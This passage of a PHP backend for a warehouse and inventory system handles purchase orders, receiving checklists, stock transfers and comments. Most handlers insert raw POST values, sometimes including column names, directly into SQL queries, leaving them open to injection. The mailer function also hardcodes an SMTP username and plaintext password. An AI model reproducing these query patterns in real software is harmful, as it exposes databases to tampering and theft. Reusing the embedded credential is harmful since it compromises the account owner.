      $result = $query->fetch_all(MYSQLI_ASSOC);
      echo json_encode($result);

   }else if(isset($_POST['get_warehouse_receiving_data'])){

      $sql = "SELECT * FROM (";
      $sql .= "SELECT a.id AS id, created_date AS order_date, a.po_id AS po_id, po, supplier_name, location, expected_arrival, a.remarks AS remarks, b.status AS status, date_received, arrival_time, invoice, trailer_no, trailer_plate, trailer_seal, po_received_by_sig, po_received_by_name, po_received_by_position, date_po_received, po_verified_by_sig, po_verified_by_name, po_verified_by_position, date_po_verified, supplier_inspected_by_sig, supplier_inspected_by_name, supplier_inspected_by_position, date_supplier_inspected, supplier_verified_by_sig, supplier_verified_by_name, supplier_verified_by_position, date_supplier_verified,(CASE WHEN supplier_inspected_by_name IS NULL THEN 'For Inspection' WHEN (supplier_inspected_by_name IS NOT NULL AND supplier_verified_by_name IS NULL) THEN 'Inspected' WHEN supplier_verified_by_name IS NOT NULL THEN 'Completed' ELSE 'No Status' END) AS checklist_status, total_comments, 1 AS record_type, b.date_added AS date_added FROM $tbl_inventory_warehouse_receiving a LEFT JOIN $tbl_inventory_purchase_orders b ON a.po_id=b.id LEFT JOIN $tbl_suppliers c ON b.supplier_id=c.id LEFT JOIN $tbl_inventory_locations d ON b.location_id=d.id WHERE deleted='0' and b.status IN ('for_delivery','received')";
      $sql .= " UNION ";
      $sql .= "SELECT a.id, transfer_date AS order_date, null, stock_no AS po, null, location, null, notes AS remarks, status, null,  null,  null,  null,  null,  null,  null,  null,  null,  null,  null,  null,  null,  null, null,  null,  null,  null,  null, received_by_sig,  received_by_name,  received_by_position,  date_received,  null, 2 AS record_type, a.date_added AS date_added FROM $tbl_inventory_stock_transfers a LEFT JOIN $tbl_inventory_locations b ON a.location_id=b.id WHERE a.deleted='0' and a.status IN ('for_delivery','received')";
      $sql .= ") a ORDER BY date_added";

      $query = $conn->query($sql);
      $result = [];
      if($query->num_rows > 0){
         $result = $query->fetch_all(MYSQLI_ASSOC);
      }
      echo json_encode([
         'data' => $result
      ]);

   }else if(isset($_POST['get_warehouse_receiving_checklist_details_by_warehouse_id'])){

      $id = $_POST['id'];
      $sql = "SELECT id, item_type, description, value, IFNULL(corrective_action,'') AS corrective_action FROM $tbl_inventory_warehouse_receiving_checklist WHERE warehouse_receiving_id=$id ORDER BY id ASC";
      $query = $conn->query($sql);
      echo json_encode($query->fetch_all(MYSQLI_ASSOC)); 

   }else if(isset($_POST['get_po_order_items'])){
      
      $po_id = $_POST['po_id'];
      $sql = "SELECT * FROM $tbl_inventory_purchase_order_items WHERE po_id=$po_id";
      $query = $conn->query($sql);
      echo json_encode($query->fetch_all(MYSQLI_ASSOC)); 

   }else if(isset($_POST['add_entry'])){

      // $formdata               = $_POST['formdata'];
      $warehouse_receiving_id = $_POST['warehouse_receiving_id'];
      $item_type              = $_POST['item_type'];
      $description            = $_POST['description'];

      $sql = "INSERT INTO $tbl_inventory_warehouse_receiving_checklist(warehouse_receiving_id,item_type,description) VALUES($warehouse_receiving_id,$item_type,'$description')";
      if($conn->query($sql) === TRUE){
         $last_id = $conn->insert_id;
         echo json_encode(success($last_id));
         exit();
      }
      echo json_encode(error($sql));

   }else if(isset($_POST['update_po'])){
   
      // $po_form = json_decode($_POST['po_form']);
      $id      = $_POST['id'];
      $expected_arrival = $_POST['expected_arrival'];
      $remarks = $_POST['remarks'];

      $where = "expected_arrival='$expected_arrival',";
      if(trim($remarks)!=""){
         $where .= "remarks='".$conn->real_escape_string($remarks)."'";
      }

      $sql = "UPDATE $tbl_inventory_purchase_orders SET $where WHERE id=$id";
      if($conn->query($sql) === TRUE){
         echo json_encode(success("Successfully Updated Purchase Order"));
         exit();
      }
      echo json_encode(error("Error Updating Purchase Order"));
   
   }else if(isset($_POST['update_status'])){

      $id = $_POST['id'];
      $status = $_POST['status'];
      $prefix = $_POST['prefix'];
      $signature_value = $_POST['signature_value'];
      $name_value = $_POST['name_value'];
      $position_value = $_POST['position_value'];

      $sig_column = $prefix."_sig";
      $name_column = $prefix."_name";
      $position_column = $prefix."_position";
      $date = "date_".substr($prefix, 0, -3);;

      $sql = "UPDATE $tbl_inventory_purchase_orders SET status='$status', $sig_column='$signature_value', $name_column='$name_value', $position_column='$position_value', $date=CURRENT_TIMESTAMP WHERE id=$id";
      if($conn->query($sql) == false){
         echo json_encode(error("Error updating PO"));
         exit();
      }
      
      if($status == "for_delivery"){

         $sql = "INSERT INTO $tbl_inventory_materials_inventory(po_id,raw_material_id,incoming,price_per_unit,total_amount,location_id) SELECT po_id,raw_material_id,a.quantity,price_per_unit,a.total_price,location_id FROM $tbl_inventory_purchase_order_items a LEFT JOIN $tbl_inventory_purchase_orders b ON a.po_id=b.id WHERE po_id=$id ON DUPLICATE KEY UPDATE incoming=IFNULL(incoming,0)+a.quantity";
         if($conn->query($sql) == false){
            echo json_encode(error("Error updating Materials Inventory"));
            exit();
         }
      }      
      echo json_encode(success("Successfully Set Status of PO"));
   
   }else if(isset($_POST['get_po_print_details'])){
   
      $results = [];
      $id = $_POST['id'];
      $sql = "SELECT a.*, DATE_FORMAT(date_drafted, '%M %e, %Y') AS date_prepared, DATE_FORMAT(date_approved, '%M %e, %Y') AS date_approved, po_received_by_sig, po_received_by_name, po_received_by_position, DATE_FORMAT(date_po_received, '%M %e, %Y') AS date_received,(CASE a.status WHEN 'received' THEN 3 WHEN 'for_delivery' THEN 2 WHEN 'for_approval' THEN 1 ELSE 0 END) AS sig_num, location,supplier_name FROM $tbl_inventory_purchase_orders a LEFT JOIN $tbl_inventory_warehouse_receiving b ON a.id=b.po_id LEFT JOIN $tbl_inventory_locations c ON a.location_id=c.id LEFT JOIN $tbl_suppliers d ON a.supplier_id=d.id WHERE a.id=$id";
      $query = $conn->query($sql);
      $results['po_data'] = $query->fetch_object();

      $sql = "SELECT * FROM $tbl_inventory_purchase_order_items WHERE po_id=$id";
      $query = $conn->query($sql);
      $results['po_items_data'] = $query->fetch_all(MYSQLI_ASSOC);
      echo json_encode($results);

   
   }else if(isset($_POST['delete_po'])){

      $id = $_POST['id'];
      $sql = "UPDATE $tbl_inventory_purchase_orders SET deleted='1' WHERE id=$id";
      if($conn->query($sql) === TRUE){
         echo json_encode(success("Successfully Deleted PO"));
         exit();
      }
      echo json_encode(error("Error Deleting PO"));

   }else if(isset($_POST['whouse_po_save'])){

      $form_items  = json_decode($_POST['form_items']);
      $table_items = json_decode($_POST['table_items']);

      $sql = "UPDATE $tbl_inventory_warehouse_receiving SET ";
      $id = ""; $po_id = "";
      foreach($form_items as $item){
         if($item->name == "id"){
            $id = $item->value;
            continue;
         }else if($item->name == "po_id"){
            $po_id = $item->value;
            continue;
         } 
         $form_cols = $item->name;// corrdate problem
         $form_vals = "'".$conn->real_escape_string($item->value)."',";
         $sql .= $form_cols."=".$form_vals;
      }
      $sql .= "date_po_received=CURRENT_TIMESTAMP";
      $sql .= " WHERE id=$id";
      if($conn->query($sql) === FAlSE){
         echo json_encode(error("Error1 Saving PO Form Details"));
         exit();
      }
      
      foreach($table_items as $table_item){

         // if(!isset($item->value)){
         //    continue;
         // }
         // $id    = $item->name;
         // $value = $item->value;
         // $sql = "UPDATE $tbl_inventory_purchase_order_items SET quantity_received=$value WHERE id=$id";

         $sql = "UPDATE $tbl_inventory_purchase_order_items SET ";
         $item_id = "";
         foreach($table_item as $item){
            
            if($item->name == "id"){
               $item_id = $item->value;
               continue;
            }
            
            if($item->value!=null){
               $form_cols = $item->name;
               $form_vals = "'".$conn->real_escape_string($item->value)."',";
               $sql      .= $form_cols."=".$form_vals;
            }
         }
         $sql = substr($sql, 0, -1);
         $sql .= " WHERE id=$item_id";

         if($conn->query($sql) === FALSE){
            echo json_encode(error($sql));
            exit();
         }
      }

      $sql = "UPDATE $tbl_inventory_purchase_orders SET status='received' WHERE id=$po_id";
      if($conn->query($sql) === FALSE){
         echo json_encode(error("Error3 Saving PO Form details"));
         exit();
      }

      // $sql = "UPDATE $tbl_inventory_materials_inventory a INNER JOIN $tbl_inventory_purchase_order_items b ON a.raw_material_id=b.raw_material_id AND a.po_id=b.po_id SET a.lot_batch_no=b.lot_batch_no, a.mfg_date=b.mfg_date, incoming=IFNULL(incoming,0)-IFNULL(b.quantity,0), a.quantity=IFNULL(a.quantity,0)+IFNULL(quantity_received,0), total_amount=((IFNULL(a.quantity,0)+IFNULL(quantity_received,0))*b.price_per_unit) WHERE b.po_id=$po_id";
      // if($conn->query($sql) === FALSE){
      //    echo json_encode(error("Error4 Saving PO Form details"));
      //    exit();
      // }

      $sql = "UPDATE $tbl_inventory_materials_inventory a INNER JOIN $tbl_inventory_purchase_order_items b ON a.raw_material_id=b.raw_material_id AND a.po_id=b.po_id SET a.supplier_lot_code=b.supplier_lot_code,a.internal_lot_code=b.internal_lot_code, a.mfg_date=b.mfg_date, incoming=IFNULL(incoming,0)-IFNULL(b.quantity,0), a.quantity=IFNULL(a.quantity,0)+IFNULL(quantity_received,0), total_amount=((IFNULL(a.quantity,0)+IFNULL(quantity_received,0))*b.price_per_unit) WHERE b.po_id=$po_id";
      if($conn->query($sql) === FALSE){
         echo json_encode(error("Error4 Saving PO Form details"));
         exit();
      }

      // add to stock card
      $sql = "INSERT INTO $tbl_inventory_stock_card(raw_material_id,location_id,value,action) SELECT raw_material_id,location_id,quantity_received,3 FROM $tbl_inventory_purchase_order_items a LEFT JOIN $tbl_inventory_purchase_orders b ON a.po_id=b.id WHERE po_id=$po_id";
      if($conn->query($sql) === FALSE){
         echo json_encode(error("Error5 Saving PO Form details"));
         exit();
      }

      echo json_encode(success("Successfully Updated Form Details"));
      exit();

   }else if(isset($_POST['whouse_supplier_save'])){

      $formdata  = json_decode($_POST['formdata']);
      $checklist = json_decode($_POST['checklist']);
      $supplier_inspected = json_decode($_POST['supplier_inspected']);
      $supplier_verified = json_decode($_POST['supplier_verified']);

      $sql = "UPDATE $tbl_inventory_warehouse_receiving SET ";
      $id = "";
      foreach($formdata as $item){
         if($item->name == "id"){
            $id = $item->value;
            continue;
         }  // skip id attr
         $form_cols = $item->name;// corrdate problem
         $form_vals = "'".$conn->real_escape_string($item->value)."',";
         $sql .= $form_cols."=".$form_vals;
      }
      if($supplier_inspected == true){
         $sql .= "date_supplier_inspected=CURRENT_TIMESTAMP,";
      }
      if($supplier_verified == true){
         $sql .= "date_supplier_verified=CURDATE(),";      
      }
      $sql = substr($sql, 0, -1);
      $sql .= " WHERE id=$id";
      if($conn->query($sql) === FAlSE){
         echo json_encode(error("Error1 Saving Supplier Form Details"));
         exit();
      }
      
      foreach($checklist as $item){
         $id                = $item->id;
         $value             = $item->value;
         $corrective_action = "'".$conn->real_escape_string($item->corrective_action)."'";
         $sql = "UPDATE $tbl_inventory_warehouse_receiving_checklist SET value=$value,corrective_action=$corrective_action WHERE id=$id";
         if($conn->query($sql) === FALSE){
            echo json_encode(error("Error2 Saving Supplier Form Details"));
            exit();
         }
      }
      echo json_encode(success("Successfully Updated Supplier Form Details"));
      exit();

   }else if(isset($_POST['get_materials_inventory'])){

      $sql = "SELECT a.*,c.sku,c.raw_materials AS material_name,c.category,c.uom,location,lot_batch_no,supplier_lot_code,internal_lot_code,(IFNULL(a.quantity,0)+IFNULL(a.str_in,0)-IFNULL(a.str_out,0)) AS variance FROM $tbl_inventory_materials_inventory a LEFT JOIN $tbl_inventory_locations b ON a.location_id=b.id LEFT JOIN $tbl_raw_materials c ON a.raw_material_id=c.id WHERE deleted='0'";

      $query = $conn->query($sql);
      $result = [];
      if($query->num_rows > 0){
         $result = $query->fetch_all(MYSQLI_ASSOC);
      }
      echo json_encode([
         'data' => $result
      ]);
      
   }else if(isset($_POST['update_inventory_cell'])){
      
      $id = $_POST['id'];
      $column = $_POST['column'];
      $value = $_POST['value'];

      $sql = "UPDATE $tbl_inventory_materials_inventory SET $column='$value' WHERE id=$id";
      if($conn->query($sql) === TRUE){
         echo json_encode(success("Successfully Updated Value"));
         exit();
      }
      echo json_encode(error("Error Updating Value"));

   }else if(isset($_POST['get_whouse_print_details'])){

      $result = [];
      $id = $_POST['id'];
      $sql = "SELECT a.supplier_inspected_by_sig,a.supplier_inspected_by_name,a.supplier_inspected_by_position,DATE_FORMAT(date_supplier_inspected, '%M %e, %Y') AS date_supplier_inspected,a.supplier_verified_by_sig,a.supplier_verified_by_name,a.supplier_verified_by_position,DATE_FORMAT(date_supplier_verified, '%M %e, %Y') AS date_supplier_verified,a.date_received,a.arrival_time,a.invoice,a.trailer_no,a.trailer_plate,a.trailer_seal,b.po,c.supplier_name,b.logo FROM $tbl_inventory_warehouse_receiving a LEFT JOIN $tbl_inventory_purchase_orders b ON a.po_id=b.id LEFT JOIN $tbl_suppliers c ON b.supplier_id=c.id WHERE a.id=$id";
      $query = $conn->query($sql);
      $result['main'] = $query->fetch_object();

      $sql = "SELECT a.id AS id,description,value,corrective_action FROM $tbl_inventory_warehouse_receiving_checklist a LEFT JOIN $tbl_inventory_warehouse_receiving b ON a.warehouse_receiving_id=b.id WHERE po_id=$id";

      $query = $conn->query($sql." AND item_type='1' ORDER BY a.id ASC");
      $result['table1'] = $query->fetch_all(MYSQLI_ASSOC);
      $query = $conn->query($sql." AND item_type='2' ORDER BY a.id ASC");
      $result['table2'] = $query->fetch_all(MYSQLI_ASSOC);

      echo json_encode($result);
      exit();
   }else if(isset($_POST['view_comments'])){

      $results = [];
      $po_id = $_POST['po_id'];
      $data_type = $_POST['data_type'];

      $sql = "SELECT id,comment, datetime, commenter FROM $tbl_inventory_comments WHERE po_id=$po_id AND comment_type='$data_type' AND parent_id IS NULL ORDER BY datetime ASC";
      $query = $conn->query($sql);
      $results['parents'] = $query->fetch_all(MYSQLI_ASSOC);

      $sql = "SELECT parent_id,comment, datetime, commenter FROM $tbl_inventory_comments WHERE po_id=$po_id AND comment_type='$data_type' AND parent_id IS NOT NULL ORDER BY datetime ASC";
      $query = $conn->query($sql);
      $results['replies'] = $query->fetch_all(MYSQLI_ASSOC);
      echo json_encode($results);

   }else if(isset($_POST['add_comment'])){

      $comment   = $conn->real_escape_string($_POST['comment']);
      $po_id     = $_POST['po_id'];
      $parent_id = $_POST['parent_id'];
      $comment_type = $_POST['comment_type'];
      $commenter = get_commenter_name();
      $datetime  = date("Y-m-d H:i:s");

      $cols = "comment_type,po_id,comment,datetime,commenter";
      $values = "'$comment_type',$po_id,'$comment','$datetime','$commenter'";
      if($parent_id){
         $cols .= ",parent_id";
         $values .= ",$parent_id";
      }
      
      $sql = "INSERT INTO $tbl_inventory_comments($cols) VALUES($values)";
      if($conn->query($sql) === TRUE){
         
         $insert_id = $conn->insert_id;

         $table = $tbl_inventory_purchase_orders;
         if($comment_type=="str"){
            $table = $tbl_inventory_stock_transfers;
         }
         
         $sql = "UPDATE $table SET total_comments=total_comments+1 WHERE id=$po_id";
         if($conn->query($sql) === FALSE){
            echo json_encode('error');
            exit();
         }

         $result = [];
         $result['id'] = $insert_id;
         $result['commenter'] = $commenter;
         $result['datetime'] = $datetime;
         $result['comment'] = $comment;
         echo json_encode($result);
         exit();
      }
      echo json_encode('error');

   }else if(isset($_POST['get_stock_transfers'])){

      $transfer_type = $_POST['transfer_type'];
      $sql = "SELECT a.*,a.id AS po_id,raw_materials AS item_name,uom,location,2 AS comment_type FROM $tbl_inventory_stock_transfers a LEFT JOIN $tbl_raw_materials b ON a.raw_material_id=b.id LEFT JOIN $tbl_inventory_locations c ON a.location_id=c.id WHERE transfer_type='$transfer_type'";
      $query = $conn->query($sql);
      echo json_encode([
         'data' => $query->fetch_all(MYSQLI_ASSOC)
      ]);

   }else if(isset($_POST['get_available_items'])){

      $location_id = $_POST['location_id'];
      $sql = "SELECT b.id AS id,raw_materials AS value FROM $tbl_inventory_materials_inventory a LEFT JOIN $tbl_raw_materials b ON a.raw_material_id=b.id WHERE location_id != $location_id GROUP BY raw_material_id";
      echo get_rows($sql);

   }else if(isset($_POST['get_current_stock'])){

      $raw_material_id = $_POST['raw_material_id'];
      $location_id = $_POST['location_id'];
      $sql = "SELECT SUM(quantity) AS current_stock, uom FROM $tbl_inventory_materials_inventory a LEFT JOIN $tbl_raw_materials b ON a.raw_material_id=b.id WHERE raw_material_id=$raw_material_id AND location_id != $location_id GROUP BY raw_material_id";
      $query = $conn->query($sql);

      $results = [];
      $results['item'] = $query->fetch_object();

      $sql = "SELECT a.id,location, quantity FROM $tbl_inventory_materials_inventory a LEFT JOIN $tbl_inventory_locations b ON a.location_id=b.id WHERE raw_material_id=$raw_material_id AND location_id != $location_id";
      $query = $conn->query($sql);
      $results['sources'] = $query->fetch_all(MYSQLI_ASSOC);
      
      echo json_encode($results);

   }else if(isset($_POST['add_stock_transfer'])){

      $formdata = json_decode($_POST['formdata']);
      $itemlist = json_decode($_POST['itemlist']);

      $cols = ""; $vals = ""; $raw_material_id = ""; $location_id = ""; $str_in_quantity = 0; 

      foreach($formdata as $item){
         
         if($item->name=="raw_material_id"){
            $raw_material_id = $item->value;
         }else if($item->name=="location_id"){
            $location_id = $item->value;
         }else if($item->name=="quantity"){
            $str_in_quantity = $item->value;
         }
         $cols .= $item->name.",";
         $vals .= "'".$conn->real_escape_string($item->value)."',";
      }
      $cols .= "transfer_type,status";
      $vals .= "'str_out','for_delivery'";

      $sql = "INSERT INTO $tbl_inventory_stock_transfers($cols) VALUES($vals)";
      if($conn->query($sql) === TRUE){

         $last_id = $conn->insert_id;

         foreach($itemlist as $item){

            $stock_transfer_id      = $last_id;
            $materials_inventory_id = $item->materials_inventory_id;
            $current_quantity       = $item->current_quantity;
            $quantity               = $item->quantity;

            $sql = "INSERT INTO $tbl_inventory_stock_transfers_sources(stock_transfer_id,materials_inventory_id,current_Stock,quantity) VALUES($stock_transfer_id,$materials_inventory_id,$current_quantity,$quantity)";

            if($conn->query($sql) === FALSE){
               echo json_encode(error("Error1 Adding Stock Transfer"));
               exit();
            }

            $sql = "UPDATE $tbl_inventory_materials_inventory SET quantity=(quantity-$quantity),str_out=(IFNULL(str_out,0)+$quantity) WHERE id=$materials_inventory_id";
            if($conn->query($sql) === FALSE){
               echo json_encode(error("Error2 Adding Stock Transfer"));
               exit();
            }
         }

         $sql = "UPDATE $tbl_inventory_materials_inventory SET str_in=(IFNULL(str_in,0)+$str_in_quantity),incoming=(IFNULL(incoming,0)+$str_in_quantity) WHERE raw_material_id=$raw_material_id AND location_id=$location_id";
         if($conn->query($sql) === FALSE){
            echo json_encode(error("Error3 Adding Stock Transfer"));
            exit();
         }

         echo json_encode(success("Successfully Added Stock Transfer"));
         exit();
      }
      echo json_encode(error("Error4 Adding Stock Transfer"));
      exit();

   }else if(isset($_POST['get_stock_transfer_details'])){

      $id = $_POST['id'];
      $sql = "SELECT a.*,location,raw_materials,uom FROM $tbl_inventory_stock_transfers a LEFT JOIN $tbl_inventory_locations b ON a.location_id=b.id LEFT JOIN $tbl_raw_materials c ON a.raw_material_id=c.id WHERE a.id=$id";
      $query = $conn->query($sql);

      $results = [];
      $results['details'] = $query->fetch_object();
      echo json_encode($results);

   }else if(isset($_POST['receive_stock_transfer'])){

      $form_items  = json_decode($_POST['form_items']);

      // UPDATE stock transfer set received by and date received
      $sql = "UPDATE $tbl_inventory_stock_transfers SET ";
      $id = "";
      foreach($form_items as $item){
         if($item->name == "id"){
            $id = $item->value;
            continue;
         }
         $form_cols = $item->name;
         $form_vals = "'".$conn->real_escape_string($item->value)."',";
         $sql .= $form_cols."=".$form_vals;
      }
      $sql .= "status='received', date_received=CURRENT_TIMESTAMP";
      $sql .= " WHERE id=$id";
      if($conn->query($sql) === FALSE){
         echo json_encode(error("Error1 Error Receiving Stock Transfer"));
         exit();
      }

      // UPDATE stock transfer out of materials inventory table
      $sql = "UPDATE $tbl_inventory_materials_inventory a LEFT JOIN $tbl_inventory_stock_transfers_sources b ON a.id=b.materials_inventory_id SET str_out=(IFNULL(str_out,0)-b.quantity) WHERE stock_transfer_id=$id";
      if($conn->query($sql) === FALSE){
         echo json_encode(error("Error2 Error Receiving Stock Transfer"));
         exit();
      }

      // add to stock card
      $sql = "INSERT INTO $tbl_inventory_stock_card(raw_material_id,location_id,value,action) SELECT raw_material_id,location_id,a.quantity,1 FROM $tbl_inventory_stock_transfers_sources a LEFT JOIN $tbl_inventory_materials_inventory b ON a.materials_inventory_id=b.id WHERE stock_transfer_id=$id";
      if($conn->query($sql) === FALSE){
         echo json_encode(error("Error4 Saving PO Form details"));
         exit();
      }

      // UPDATE stock transfer in of materials inventory table
      $sql = "UPDATE $tbl_inventory_materials_inventory a LEFT JOIN $tbl_inventory_stock_transfers b ON a.raw_material_id=b.raw_material_id AND a.location_id=b.location_id SET incoming=(IFNULL(incoming,0)-b.quantity),str_in=(IFNULL(str_in,0)-b.quantity),a.quantity=(IFNULL(a.quantity,0)+b.quantity) WHERE b.id=$id";
      if($conn->query($sql) === FALSE){
         echo json_encode(error("Error3 Error Receiving Stock Transfer"));
         exit();
      }

      // add to stock card
      $sql = "INSERT INTO $tbl_inventory_stock_card(raw_material_id,location_id,value,action) SELECT raw_material_id,location_id,quantity,2 FROM $tbl_inventory_stock_transfers WHERE id=$id";
      if($conn->query($sql) === FALSE){
         echo json_encode(error("Error4 Saving PO Form details"));
         exit();
      }

      echo json_encode(success("Successfully Received Stock Transfer"));
      exit();
      
   }else if(isset($_POST['get_stock_card_details'])){

      $raw_material_id = isset($_POST['raw_material_id']) ? $_POST['raw_material_id'] : null; 
      $location_id     = isset($_POST['location_id']) ? $_POST['location_id'] : null; 
      if($raw_material_id == null){
         echo json_encode([
            'data' => []
         ]);
         exit();
      }
      // $start_date  = $_POST['location_id'];
      // $end_date    = $_POST['location_id'];

      // $sql = "SELECT *,(transfer_in+deliveries-transfer_out) AS quantity FROM (SELECT DATE_FORMAT(date,'%b-%d') AS date, SUM(IF(ACTION=1,VALUE,0)) AS transfer_out, SUM(IF(ACTION=2,VALUE,0)) AS transfer_in, SUM(IF(ACTION=3,VALUE,0)) AS deliveries FROM $tbl_inventory_stock_card WHERE raw_material_id=$raw_material_id AND location_id=$location_id) a";
      $sql = "SELECT dt,formatted_date,ROUND(IF(quantity IS NULL, prev_quantity,quantity),0) AS quantity,transfer_out,transfer_in,deliveries FROM ( SELECT DATE_FORMAT(dt, '%Y-%m-%d') AS dt,DATE_FORMAT(dt,'%b %d, %Y') AS formatted_date, quantity,transfer_out,transfer_in,deliveries,@prev_quantity:=IFNULL(quantity,@prev_quantity) AS prev_quantity FROM ( WITH RECURSIVE cte(dt) AS ( SELECT MIN(DATE) AS dt FROM $tbl_inventory_stock_card WHERE raw_material_id=$raw_material_id AND location_id=$location_id UNION ALL SELECT dt + INTERVAL 1 DAY FROM cte WHERE dt < CURDATE() ) SELECT dt,quantity,transfer_out,transfer_in,deliveries FROM cte a LEFT JOIN ( SELECT *,(transfer_in+deliveries-transfer_out) AS quantity FROM ( SELECT date, SUM(IF(ACTION=1,VALUE,0)) AS transfer_out, SUM(IF(ACTION=2,VALUE,0)) AS transfer_in, SUM(IF(ACTION=3,VALUE,0)) AS deliveries FROM $tbl_inventory_stock_card WHERE raw_material_id=$raw_material_id AND location_id=$location_id GROUP BY DATE_FORMAT(date,'%b-%d-%Y') ) b ) c ON DATE_FORMAT(a.dt,'%b-%d-%Y')=DATE_FORMAT(c.date,'%b-%d-%Y') ) d ) e ORDER BY dt ASC";
      $query  = $conn->query($sql);
      $result = $query->fetch_all(MYSQLI_ASSOC);
      $results = [];
      $current_quantity = 0;
      foreach($result as $item){
         $item_quantity = $item['quantity'];
         if($item_quantity != null){
            $current_quantity = $item_quantity;
         }else{
            $item['quantity'] = $current_quantity;
         }
         $results[] = $item;
      }
      // echo json_encode($result);
      echo json_encode([
         'data' => $results
      ]);

   // -- JANUARY 10, 2024 -- API START --
   }else if(isset($_POST['get_production_products_data'])){ 
      
      $sql = "SELECT * FROM $tbl_inventory_production_products";
      $query = $conn->query($sql);
      $result = $query->fetch_all(MYSQLI_ASSOC);
      echo json_encode([
         'data' => $result
      ]);
   }else if(isset($_POST['get_production_formulation_data'])){
      
      $sql = "SELECT * FROM $tbl_inventory_production_formulation";
      $query = $conn->query($sql);
      $result = $query->fetch_all(MYSQLI_ASSOC);
      echo json_encode([
         'data' => $result
      ]);
   }else if(isset($_POST['get_production_in_progress_data'])){
      
      $sql = "SELECT * FROM $temp_inventory_production_in_progress";
      $query = $conn->query($sql);
      $result = $query->fetch_all(MYSQLI_ASSOC);
      echo json_encode([
         'data' => $result
      ]);
   }else if(isset($_POST['get_sales_open_data'])){
      
      $sql = "SELECT * FROM $tbl_inventory_sales";
      $query = $conn->query($sql);
      $result = $query->fetch_all(MYSQLI_ASSOC);
      echo json_encode([
         'data' => $result
      ]);
   }
   // -- JANUARY 10, 2024 -- API END --

   function success($message){
      $result = [];
      $result['type'] = 'success';
      $result['message'] = $message;
      return $result;
   }

   function error($message){
      $result = [];
      $result['type'] = 'error';
      $result['message'] = $message;
      return $result;
   }

   function with_duplicate($sql){

      global $conn;
      $query = $conn->query($sql);
      $count = $query->num_rows;

      if($count>0){
         return true;
      }
      return false;
   }

   // FOR INTEGRATION
   use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\SMTP;
	use PHPMailer\PHPMailer\Exception;
	function php_mailer($to, $user, $subject, $body) {
		require 'PHPMailer/src/Exception.php';
		require 'PHPMailer/src/PHPMailer.php';
		require 'PHPMailer/src/SMTP.php';

		$mail = new PHPMailer(true);
		try {
		    $mail->isSMTP();
		    $mail->Host       = 'mail.prpblaster.com';
		    $mail->CharSet 	  = 'UTF-8';
		    $mail->SMTPAuth   = true;
		    $mail->Username   = 'fsms@prpblaster.com';
		    $mail->Password   = 'Brandon@2020';
		    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
		    $mail->Port       = 465;
		    $mail->setFrom('fsms@prpblaster.com', 'Interlink IQ');
		    $mail->addAddress($to, $user);

		    $mail->isHTML(true);
		    $mail->Subject = $subject;
		    $mail->Body    = $body;

		    $mail->send();
		    $msg = 'Message has been sent';
		} catch (Exception $e) {
		    $msg = "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
		}

		return $msg;
	}

   function get_user_logo(){

      return "https://interlinkiq.com/companyDetailsFolder/133548%20-%20Fat%20and%20Weird%20Cookies%20-%20FINAL.png";
   }

   function get_locations(){
      
      global $tbl_inventory_locations,$col_location_id,$col_location_location;
      $sql = "SELECT $col_location_id, $col_location_location AS value FROM $tbl_inventory_locations";
      return get_rows($sql);
   }

   function get_suppliers(){

      global $tbl_suppliers,$col_suppliers_id,$col_supplier_name;
      $sql = "SELECT $col_suppliers_id,$col_supplier_name AS value FROM $tbl_suppliers";
      return get_rows($sql);
   }

   function get_raw_mats($supplier_id){

      global $tbl_raw_materials;
      $sql = "SELECT * FROM $tbl_raw_materials WHERE supplier_id=$supplier_id";
      return get_rows($sql);
   }

   function get_commenter_name(){
      return "Alex Polo";
   }

   function get_rows($sql){
      
      global $conn;
      $query = $conn->query($sql);
      $result = $query->fetch_all(MYSQLI_ASSOC);
      return json_encode($result);
   }
?>
